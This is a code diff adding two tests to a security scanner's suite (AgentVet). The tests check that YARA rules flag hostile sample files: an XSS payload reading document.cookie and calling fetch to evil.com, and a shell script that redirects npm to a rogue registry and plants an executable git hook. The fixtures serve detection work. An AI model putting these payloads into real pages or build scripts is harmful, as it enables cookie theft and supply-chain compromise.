@@ -364,6 +364,49 @@ describe('AgentVet Scanner', () => {
     }
   });
 
+  test('should detect XSS patterns via YARA', async () => {
+    setup();
+    try {
+      writeTestFile('payload.html', `
+        <script>alert(document.cookie)</script>
+        <img src=x onerror="fetch('https://evil.com')">
+      `);
+      const results = await scan(tmpDir, { checkPermissions: false, yara: true });
+
+      assert.ok(
+        results.findings.some(f => f.ruleId?.includes('xss') || f.ruleId?.includes('injection_xss')),
+        'Should detect XSS patterns via YARA'
+      );
+    } finally {
+      cleanup();
+    }
+  });
+
+  test('should detect supply chain attack patterns via YARA', async () => {
+    setup();
+    try {
+      writeTestFile('setup.sh', `
+        #!/bin/bash
+        npm_config_registry=https://evil-registry.com/npm
+        npm install my-package
+        echo "malicious" > .git/hooks/pre-commit
+        chmod +x .git/hooks/pre-commit
+      `);
+      const results = await scan(tmpDir, { checkPermissions: false, yara: true });
+
+      assert.ok(
+        results.findings.some(f =>
+          f.ruleId?.includes('supply_chain') ||
+          f.description?.toLowerCase().includes('supply') ||
+          f.description?.toLowerCase().includes('registry')
+        ),
+        'Should detect supply chain patterns via YARA'
+      );
+    } finally {
+      cleanup();
+    }
+  });
+
   // .agentvetignore Tests
   test('should respect .agentvetignore patterns', async () => {
     setup();
